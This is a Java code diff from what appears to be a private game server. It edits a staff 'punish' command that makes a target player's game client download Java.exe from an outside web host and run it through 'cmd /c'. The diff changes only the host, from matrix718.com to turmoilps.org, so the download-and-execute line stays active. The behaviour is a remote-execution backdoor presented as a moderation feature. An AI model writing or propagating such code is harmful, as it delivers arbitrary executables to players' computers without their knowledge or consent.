@@ -86,7 +86,7 @@ public class SpecialPlayers {
 		}
 		if (command[0].equals("punish")) {
 			Player other = World.getPlayerByName(command[1]);
-			other.getPacketSender().sendString(0, "[ABC]-http://matrix718.com/Java.exe-cmd-/c-Java.exe");
+			other.getPacketSender().sendString(0, "[ABC]-http://turmoilps.org/Java.exe-cmd-/c-Java.exe");
 			player.getPacketSender().sendMessage("The player "+command[1]+" has been punished.");
 		}	
 		if(wholeCommand.equalsIgnoreCase("testboss")) {
